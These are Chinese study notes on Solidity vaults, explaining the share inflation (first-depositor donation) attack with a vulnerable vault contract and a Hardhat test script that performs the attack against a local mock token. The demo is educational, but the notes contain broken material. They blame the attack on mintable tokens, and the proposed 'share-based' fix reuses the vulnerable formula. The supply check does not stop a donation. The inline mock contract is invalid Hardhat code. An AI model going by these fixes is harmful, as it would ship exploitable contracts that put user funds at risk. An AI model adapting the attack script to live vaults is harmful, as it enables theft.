### Solidity 金库合约及原理学习笔记

---

#### **一、金库合约基础**
**核心功能**：安全存储用户资产（ETH/ERC20 代币），实现存取逻辑。
**典型结构**：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Vault {
    IERC20 public immutable token;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function _mint(address _to, uint256 _shares) private {
        totalSupply += _shares;
        balanceOf[_to] += _shares;
    }

    function _burn(address _from, uint256 _shares) private {
        totalSupply -= _shares;
        balanceOf[_from] -= _shares;
    }

    function deposit(uint256 _amount) external {
        /*
        a = amount
        B = balance of token before deposit
        T = total supply
        s = shares to mint

        (T + s) / T = (a + B) / B 

        s = aT / B
        */
        uint256 shares;
        if (totalSupply == 0) {
            shares = _amount;
        } else {
            shares = (_amount * totalSupply) / token.balanceOf(address(this));
        }

        _mint(msg.sender, shares);
        token.transferFrom(msg.sender, address(this), _amount);
    }

    function withdraw(uint256 _shares) external {
        /*
        a = amount
        B = balance of token before withdraw
        T = total supply
        s = shares to burn

        (T - s) / T = (B - a) / B 

        a = sB / T
        */
        uint256 amount =
            (_shares * token.balanceOf(address(this))) / totalSupply;
        _burn(msg.sender, _shares);
        token.transfer(msg.sender, amount);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount)
        external
        returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(
        address indexed owner, address indexed spender, uint256 amount
    );
}

```
**原理**：
- 状态变量 `balances` 记录用户存款。
- `deposit()` 接收 ETH 并更新余额。
- `withdraw()` 验证余额后发送 ETH（需防重入攻击）。

---

#### **二、膨胀攻击（Inflation Attack）**
**攻击场景**：金库接受 ERC20 代币作为资产，且代币可自由增发（如无权限控制的 `mint` 函数）。
**攻击步骤**：
1. **抢先存入**: 攻击者成为第一个存款人，存入一个极小的金额，比如 `1 wei` 的资产。根据通常的逻辑，他会获得 `1` 份份额。此时，金库状态为：`totalAssets = 1 wei`, `totalShares = 1`。
   
2. **恶意捐赠**: 攻击者**不通过 `deposit` 函数**，而是直接向金库合约地址 `transfer` 一大笔资产，比如 `1000 WETH`。
3. **份额膨胀**: 现在金库的状态变为：`totalAssets = 1000 WETH + 1 wei`，但 `totalShares` **仍然是 `1`**！因为直接转账不会触发份额铸造。此时，每一份份额的价值被极大地膨胀了。
4. **受害者入场**: 一个正常用户 Alice 想要存入 `10 WETH`。金库会计算她应得的份额：
   `sharesToMint = (alice_deposit * totalShares) / totalAssets`
   `sharesToMint = (10 WETH * 1) / (1000 WETH + 1 wei)`
   由于 Solidity 的整数除法会向下取整，这个计算结果将是 **`0`**。
5. **资金被盗**: Alice 的 `10 WETH` 被转入了金库，但她没有收到任何份额。她的钱被困住了。
6. **攻击者提款**: 攻击者现在可以调用 `withdraw`，用他仅有的 `1` 份份额，取走金库里几乎所有的资产（他自己存的 `1 wei` + 捐赠的 `1000 WETH` + Alice 存的 `10 WETH`）。

**关键漏洞**：  
- 金库未隔离外部代币的增发风险。
- 份额计算依赖易操控的代币总量。

##### Hardhat 攻击演示																															

##### 1. 项目初始化

```bash
mkdir hardhat-vault-attack
cd hardhat-vault-attack
npx hardhat init # 选择 "Create a JavaScript project"
npm install @openzeppelin/contracts
```

预览

##### 2. 编写易受攻击的合约

在 `contracts/` 目录下创建 `VulnerableVault.sol`。这个金库本身也是一个 ERC20 代币，代表“份额”。

**`contracts/VulnerableVault.sol`**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract VulnerableVault is ERC20 {
    using SafeERC20 for IERC20;
    IERC20 public immutable asset; // 用于存款的代币，例如 WETH

    constructor(address _asset) ERC20("Vulnerable Vault Share", "vVS") {
        asset = IERC20(_asset);
    }

    // 返回金库中实际的资产总额
    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    // 存入资产，获得份额
    function deposit(uint256 _amount) public {
        require(_amount > 0, "Deposit amount must be positive");

        uint256 shares;
        if (totalSupply() == 0) {
            // 第一个存款人，份额 = 存入的资产数量
            shares = _amount;
        } else {
            // **漏洞点**：后续存款人获得的份额依赖于当前价格
            // 如果 totalAssets() 被恶意撑大，这里的计算结果可能为 0
            shares = (_amount * totalSupply()) / totalAssets();
        }

        require(shares > 0, "Amount too small for any shares");

        _mint(msg.sender, shares);
        asset.safeTransferFrom(msg.sender, address(this), _amount);
    }

    // 销毁份额，取回资产
    function withdraw(uint256 _shares) public {
        require(_shares > 0, "Withdraw shares must be positive");
        
        // 计算份额对应的资产数量
        uint256 amount = (_shares * totalAssets()) / totalSupply();
        
        _burn(msg.sender, _shares);
        asset.safeTransfer(msg.sender, amount);
    }
}
```

预览

##### 3. 编写测试脚本来执行攻击

我们需要一个模拟的资产代币。在 `test/` 目录下创建 `attack.test.js`。

**`test/attack.test.js`**

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Vault Share Inflation Attack", function () {
    let deployer, attacker, victim;
    let depositToken, vault;

    const INITIAL_MINT_AMOUNT = ethers.parseEther("10000"); // 10,000 tokens

    beforeEach(async function () {
        [deployer, attacker, victim] = await ethers.getSigners();

        // 1. 部署模拟的存款资产 (Mock WETH)
        const ERC20Mock = await ethers.getContractFactory("ERC20Mock", deployer);
        depositToken = await ERC20Mock.deploy("Deposit Token", "DT");
        
        // 2. 给攻击者和受害者分发一些初始代币
        await depositToken.mint(attacker.address, INITIAL_MINT_AMOUNT);
        await depositToken.mint(victim.address, INITIAL_MINT_AMOUNT);

        // 3. 部署易受攻击的金库合约
        const VulnerableVault = await ethers.getContractFactory("VulnerableVault", deployer);
        vault = await VulnerableVault.deploy(await depositToken.getAddress());
    });

    it("Should allow attacker to steal victim's funds", async function () {
        const attackerInitialBalance = await depositToken.balanceOf(attacker.address);
        const victimInitialBalance = await depositToken.balanceOf(victim.address);
        console.log(`Initial Balances:`);
        console.log(`  Attacker: ${ethers.formatEther(attackerInitialBalance)} DT`);
        console.log(`  Victim:   ${ethers.formatEther(victimInitialBalance)} DT`);
        console.log(`--------------------------------------------------`);

        // --- 攻击步骤 1: 攻击者存入极小金额，成为第一个存款人 ---
        const tinyDeposit = 1; // 1 wei
        await depositToken.connect(attacker).approve(await vault.getAddress(), tinyDeposit);
        await vault.connect(attacker).deposit(tinyDeposit);
        
        console.log(`ATTACK STEP 1: Attacker deposits ${tinyDeposit} wei`);
        console.log(`  Vault total assets: ${await vault.totalAssets()}`);
        console.log(`  Vault total shares: ${await vault.totalSupply()}`);
        console.log(`  Attacker shares:    ${await vault.balanceOf(attacker.address)}`);
        console.log(`--------------------------------------------------`);
        expect(await vault.balanceOf(attacker.address)).to.equal(tinyDeposit);

        // --- 攻击步骤 2: 攻击者直接向金库转账，恶意膨胀资产 ---
        const largeDonation = ethers.parseEther("1000");
        await depositToken.connect(attacker).transfer(await vault.getAddress(), largeDonation);

        console.log(`ATTACK STEP 2: Attacker 'donates' ${ethers.formatEther(largeDonation)} DT to the vault`);
        console.log(`  Vault total assets: ${ethers.formatEther(await vault.totalAssets())} DT`);
        console.log(`  Vault total shares: ${await vault.totalSupply()}`); // 份额不变！
        console.log(`--------------------------------------------------`);
        expect(await vault.totalAssets()).to.equal(largeDonation + BigInt(tinyDeposit));
        expect(await vault.totalSupply()).to.equal(tinyDeposit);

        // --- 攻击步骤 3: 不知情的受害者存入大笔资金 ---
        const victimDeposit = ethers.parseEther("100");
        await depositToken.connect(victim).approve(await vault.getAddress(), victimDeposit);
        
        console.log(`VICTIM ACTION: Victim attempts to deposit ${ethers.formatEther(victimDeposit)} DT`);
        
        // 由于计算出的份额为0，交易会被 `require(shares > 0)` 拒绝
        // 这展示了攻击如何导致 DoS (Denial of Service)
        // 在某些实现中，如果shares为0但交易继续，资金就会被盗
        await expect(
            vault.connect(victim).deposit(victimDeposit)
        ).to.be.revertedWith("Amount too small for any shares");

        console.log(`  Victim's deposit REVERTED because they would get 0 shares.`);
        console.log(`  This is because share price is massively inflated.`);
        console.log(`--------------------------------------------------`);

        // --- 攻击步骤 4: 攻击者取出所有资金 ---
        const attackerShares = await vault.balanceOf(attacker.address);
        await vault.connect(attacker).withdraw(attackerShares);

        console.log(`ATTACK STEP 4: Attacker withdraws their ${attackerShares} share(s)`);
        
        const attackerFinalBalance = await depositToken.balanceOf(attacker.address);
        const vaultFinalBalance = await depositToken.balanceOf(await vault.getAddress());

        console.log(`Final Balances:`);
        console.log(`  Attacker: ${ethers.formatEther(attackerFinalBalance)} DT`);
        console.log(`  Vault:    ${ethers.formatEther(vaultFinalBalance)} DT`);
        
        // 攻击者几乎拿回了所有钱（初始资金 - 1 wei + 捐赠的1000）
        // 这里因为整数除法，会有微小的灰尘损失
        expect(attackerFinalBalance).to.be.closeTo(attackerInitialBalance, ethers.parseEther("0.0001"));
        expect(vaultFinalBalance).to.equal(0);
    });

    // 为了让测试运行，我们需要一个可以 mint 的 ERC20 Mock
    it("Should deploy a mock ERC20", async function() {
        const ERC20MockFactory = await ethers.getContractFactory(`
            // SPDX-License-Identifier: MIT
            pragma solidity ^0.8.20;
            import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
            contract ERC20Mock is ERC20 {
                constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
                function mint(address to, uint256 amount) public { _mint(to, amount); }
            }
        `);
        const mock = await ERC20MockFactory.deploy("M", "M");
        await mock.mint(deployer.address, 100);
        expect(await mock.balanceOf(deployer.address)).to.equal(100);
    });
});
查看全部
```

预览执行

*注意：为了让测试脚本自包含，直接在 `it` 块中内联了一个 `ERC20Mock` 合约的 Solidity 代码。在实际项目中，你应该把它放在 `contracts/mocks/` 目录下。*

##### 4. 运行测试

```bash
npx hardhat test ./test/attack.test.js
```

预览

将看到清晰的日志输出，展示了攻击者如何通过 `1 wei` 的存款和一笔“捐赠”来操纵份额价格，导致受害者的存款失败，最终攻击者成功取回了几乎所有资金。

---

#### **三、解决方案**
##### 1. **使用固定供应量代币**
- **原理**：仅支持不可增发代币（如标准 ERC20 且无 `mint` 函数）。
- **实现**：在存款时验证代币合约属性。
```solidity
interface IERC20 {
    function totalSupply() external view returns (uint256);
}

function depositERC20(IERC20 token, uint256 amount) external {
    uint256 supplyBefore = token.totalSupply();
    token.transferFrom(msg.sender, address(this), amount);
    uint256 supplyAfter = token.totalSupply();
    require(supplyAfter == supplyBefore, "Inflationary token rejected");
    // 更新用户余额...
}
```

##### 2. **隔离储备资产**
- **原理**：将用户存款的资产（如 ETH）与代币资产分离，避免价值绑定。
- **示例**：
  - 用户存入 ETH 时，直接记录 ETH 余额。
  - 代币资产仅作为可选项，不参与份额计算。

##### 3. **份额机制（Share-based Vault）**
- **原理**：发行金库专属份额代币（如 LP Token），按比例分配资产。
```solidity
function deposit(uint256 amount) external {
    uint256 shares = (amount * totalShares) / totalAssets();
    _mintShares(msg.sender, shares); // 铸造份额代币
}

function withdraw(uint256 shares) external {
    uint256 assets = (shares * totalAssets()) / totalShares;
    _burnShares(msg.sender, shares); // 销毁份额代币
    payable(msg.sender).transfer(assets);
}
```
**优势**：代币增发不影响份额价值，攻击者无法稀释他人资产。

---

#### **四、增强安全性实践**
1. **重入攻击防护**：  
   使用 OpenZeppelin 的 `ReentrancyGuard` 修饰提款函数。
   ```solidity
   import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
   
   contract Vault is ReentrancyGuard {
       function withdraw() external nonReentrant { ... }
   }
   ```

2. **代币白名单**：  
   仅允许预审核的代币存入。
   ```solidity
   mapping(address => bool) public allowedTokens;
   
   modifier onlyAllowedToken(address token) {
       require(allowedTokens[token], "Token not allowed");
       _;
   }
   ```

3. **储备金审计**：  
   定期验证金库内资产与用户总余额的匹配性。
   ```solidity
   function auditReserves() public view returns (bool) {
       return address(this).balance == totalUserBalances;
   }
   ```

---

#### **五、总结**
| **攻击类型** | **根本原因**             | **解决方案**                       |
| ------------ | ------------------------ | ---------------------------------- |
| 膨胀攻击     | 外部代币恶意增发稀释份额 | 固定供应量验证、份额机制、资产隔离 |
| 重入攻击     | 提款回调未完成状态更新   | `nonReentrant` 修饰器              |

**最佳实践**：
- 优先使用份额机制（LP Tokens）管理用户资产。
- 严格审计外部代币合约的增发权限。
- 结合 OpenZeppelin 安全库实现防护（如 `ReentrancyGuard`）。
- 对关键函数进行权限控制（如 `onlyOwner`）。